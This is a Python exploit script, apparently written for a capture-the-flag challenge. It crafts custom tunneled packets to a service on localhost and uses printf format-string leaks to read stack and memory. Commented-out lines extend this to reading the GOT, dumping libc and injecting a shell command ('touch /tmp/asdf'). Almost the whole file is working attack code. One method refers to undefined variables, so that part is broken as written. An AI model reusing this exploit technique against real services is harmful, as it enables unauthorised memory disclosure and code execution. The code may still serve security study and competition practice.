#!/usr/bin/env python

import socket
import struct
import puppeteer as p
import logging
import standard_logging#pylint:disable=unused-import

ADDR = "localhost"
PORT = 3544

class Poop(p.Manipulator):
    def __init__(self, host, port):
        p.Manipulator.__init__(self)
        ##########################
        # setup addrinfo and stuff
        self.port = port

        ai_family, ai_socktype, self.ai_protocol, self.ai_canonname, self.ai_addr = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_DGRAM)[0]
        sockfd = socket.socket(ai_family, ai_socktype)
        sockfd.connect(self.ai_addr)

        self.ipaddr = socket.inet_aton(self.ai_addr[0])
        self.nipaddr = struct.unpack("cccc", self.ipaddr)
        self.nipaddr = chr(~ord(self.nipaddr[0]) & 0xff) + \
                            chr(~ord(self.nipaddr[1]) & 0xff) + \
                            chr(~ord(self.nipaddr[2]) & 0xff) + \
                            chr(~ord(self.nipaddr[3]) & 0xff)

        self.c = p.Connection(s=sockfd)
        self.connect()

        self.permanent_info['main_start'] = 0x0804C00F
        self.permanent_info['main_end'] = 0x0804C2DC
        self.permanent_info['main_stackframe_size'] = 680

    def _implemented_connect(self): return False

    def connect(self): #pylint:disable=no-self-use
        data = "SYN"
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(17)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += self.ipaddr                                                                  # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += self.nipaddr                                                                 # ~ip
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", self.port)
        hdr += struct.pack(">H", len(data) + 8)
        hdr = hdr.ljust(48, "L")
        buf = hdr + data
        self.c.send(buf)

        synack = self.c.recv(1024)
        synack = synack.split("SYNACK")
        intval = synack[-1]

        data = ("ACK" + intval)
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(17)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += self.ipaddr                                                                  # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += self.nipaddr                                                                 # ~ip
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", self.port)
        hdr += struct.pack(">H", len(data) + 8)
        hdr = hdr.ljust(48, "L")
        buf = hdr + data

        self.c.send(buf)
        print "RECV:",self.c.recv(1024)

    def hit_it(self, data):
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(17)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += self.ipaddr                                                                  # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += self.nipaddr                                                                 # ~ip
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", self.port)
        hdr += struct.pack(">H", len(data) + 8)
        hdr = hdr.ljust(48, "L")

        self.c.send(hdr + data)
        r = self.c.read(10386)
        #print "GOT: %d" % len(r)
        return r

    def hit_it_snipped(self, data):
        r = self.hit_it(data)
        #print "RESULT",repr(r)
        f = r[56:]
        if '\0' in f:
            f = f[:f.index('\0')]
        return f

    def pn(self, fmt):
        rdata_1 = "echo   %".ljust(100, "\x00")
        data = "n\x00" 
        data += struct.pack(">H", DPORT) 
        data += struct.pack(">H", len(rdata_1) + 8)
        data += "DD" 
        data += rdata_1
        data2 = "A" * 48
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(44)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += ipaddr                                                                   # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += nipaddr                                                                  # ~ip
        hdr += chr(17)
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", 0x1)
        hdr += struct.pack(">H", len(data2) + 8)
        hdr = hdr.ljust(48, "L")

        buf = hdr + data

        sockfd.sendall(buf)

        rdata = "FUCK"
        data = "n\x00" 
        data += struct.pack(">H", DPORT) 
        data += struct.pack(">H", len(rdata) + 8 + 8 + 88)
        data += "DD" 
        data += rdata
        data2 = "A" * 48
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(44)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += ipaddr                                                                   # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += nipaddr                                                                  # ~ip
        hdr += chr(17)
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", 0x11)
        hdr += struct.pack(">H", len(data2) + 8)
        hdr = hdr.ljust(48, "L")

        buf = hdr + data

        sockfd.sendall(buf)

        rdata = ""
        data = "n\x00" 
        data += struct.pack(">H", DPORT) 
        data += struct.pack(">H", len(rdata) + 8 + 8 + 4 + 88)
        data += "DD" 
        data += rdata
        data2 = "A" * 48
        hdr = "AAAA"
        hdr += struct.pack(">H", len(data) + 8)                                         # data len
        hdr += chr(44)                                                                  # protocol
        hdr = hdr.ljust(24, "L")
        hdr += "\x20\x01\x00\x00"
        hdr += ipaddr                                                                   # ip
        hdr += "\x00\x00\xf2\x27"
        hdr += nipaddr                                                                  # ~ip
        hdr += chr(17)
        hdr = hdr.ljust(42, "L")
        hdr += struct.pack(">H", 0x40)
        hdr += struct.pack(">H", len(data2) + 8)
        hdr = hdr.ljust(48, "L")

        buf = hdr + data

        sockfd.sendall(buf)

        print sockfd.recv(1024)

    @p.printf(max_length=150, byte_offset=61)
    def format(self, fmt):
        r = self.hit_it_snipped("echo " + fmt)
        #print "FORMAT:",f
        return r

def main(host, port):
    #logging.getLogger('puppeteer.manipulator').setLevel(logging.DEBUG)

    b = Poop(host, int(port))
    #print repr(b.dump_stack(1000, offset=18100*4))
    #s = b.dump_stack(1000)

    #s = b.do_memory_read(0x0804DFF4, 0x0804E0D8-0x0804DFF4)
    #got_addrs = struct.unpack("<%dI" % (len(s)/4), s)
    #print [ hex(g) for g in got_addrs ]
    #max_libc = max([ g for g in got_addrs if g > 0x09000000 ])
    #b.dump_elf(max_libc, filename='libc')

    #for i in range(1, 100):
    #   print i, repr(b.format("%%%d$08x" % i))
    print hex(struct.unpack(">I", b.format("%%%d$08x" % 9).decode('hex'))[0] - 60)


    #b.format("echo $(touch /tmp/asdf) TEST%10$08xTEST")
    #b.format("echo $(touch /tmp/asdf) TEST%10$08xTEST")
    #b.format("ONE")
    #b.format("TWO")
    #b.format("THREE")


    #main_ret_addr = b.main_return_address(0x1279C/4)
    #print hex(main_ret_addr)
    #print "GOT:", repr(b.do_printf("AAAA%1$08xBBBB"))
    #print "GOT:", repr(b.do_printf("AAAA%2$08xBBBB"))
    #print "GOT:", repr(b.do_printf("AAAA%3$08xBBBB"))
    #print "GOT:", repr(b.do_printf("AAAA%4$08xBBBB"))
    #print "GOT:", repr(b.do_printf("AAAA%5$08xBBBB"))
    #print len(b.dump_stack(1000))
    #print repr(b.hit_it_snipped("echo ok"))
    #for i in range(1, 1000):
    #   print i
    #   b.format.puppeteer_flags['fmt_flags']['byte_offset'] = i
    #print repr(b.do_memory_read(0x0804B451, 10))
    #   if bb == '\x90':
    #       break
    #print "BOOM",p.hit_it("ls")
    #__import__('IPython').embed()

if __name__ == '__main__':
    import sys
    main(*sys.argv[1:])
